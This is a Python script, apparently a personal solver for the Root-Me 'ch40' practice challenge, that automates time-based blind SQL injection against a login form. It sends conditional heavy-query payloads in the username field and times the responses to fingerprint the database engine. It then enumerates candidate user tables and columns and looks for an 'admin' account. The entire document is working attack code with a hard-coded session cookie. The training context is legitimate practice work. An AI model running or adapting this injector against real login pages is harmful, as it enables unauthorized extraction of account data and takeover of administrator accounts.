#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 31 - IDENTIFICAR DB SOLO CON EXISTS
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM member, member T1)"
        self.technique = "1 AND IF({cond}, 0, {heavy})"  # AND IF invertido
        
    def test_payload_login(self, payload, repeats=5):
        tiempos = []
        data = {"username": payload, "password": "test"}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.post(URL + "?action=login", data=data, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload_login(payload, repeats=2)
        return t > self.threshold
    
    def exists(self, query):
        """Verifica si una consulta existe (devuelve algo)"""
        return self.is_true(f"EXISTS({query})")

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  IDENTIFICANDO BASE DE DATOS")
print("="*70)

# 1. Identificar MySQL
print("\n[1] ¿Es MySQL?")
if injector.exists("SELECT * FROM information_schema.tables"):
    print("  ✅ information_schema.tables existe -> Posible MySQL")
else:
    print("  ❌ No es MySQL")

# 2. Identificar SQLite
print("\n[2] ¿Es SQLite?")
if injector.exists("SELECT * FROM sqlite_master"):
    print("  ✅ sqlite_master existe -> Posible SQLite")
else:
    print("  ❌ No es SQLite")

# 3. Identificar PostgreSQL
print("\n[3] ¿Es PostgreSQL?")
if injector.exists("SELECT * FROM pg_catalog.pg_tables"):
    print("  ✅ pg_tables existe -> Posible PostgreSQL")
else:
    print("  ❌ No es PostgreSQL")

# 4. Identificar MSSQL
print("\n[4] ¿Es MSSQL?")
if injector.exists("SELECT * FROM sysobjects"):
    print("  ✅ sysobjects existe -> Posible MSSQL")
else:
    print("  ❌ No es MSSQL")

# 5. Verificar tablas de usuarios
print("\n[5] Buscando tablas de usuarios:")

tablas = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores', 'accounts', 'profile']

for tabla in tablas:
    if injector.exists(f"SELECT * FROM {tabla}"):
        print(f"  ✅ {tabla} existe")
    else:
        print(f"  ❌ {tabla} no existe")

# 6. Verificar columnas en las tablas que existen
print("\n[6] Buscando columnas de usuario:")

tablas_existentes = ['users', 'usuarios', 'member', 'members', 'admin', 'administradores', 'accounts', 'profile']
columnas = ['username', 'user', 'login', 'name', 'email']

for tabla in tablas_existentes:
    if injector.exists(f"SELECT * FROM {tabla}"):
        print(f"\n  Tabla: {tabla}")
        for col in columnas:
            if injector.exists(f"SELECT {col} FROM {tabla}"):
                print(f"    ✅ {col} existe")
                
                # Verificar si contiene 'admin'
                if injector.exists(f"SELECT {col} FROM {tabla} WHERE {col}='admin'"):
                    print(f"      ✅ ¡'admin' encontrado en {tabla}.{col}!")
                    print(f"\n" + "="*70)
                    print(f"  🎯 ¡ENCONTRADO! Tabla: {tabla}, Columna: {col}")
                    print("="*70)
                    exit(0)
            else:
                print(f"    ❌ {col} no existe")
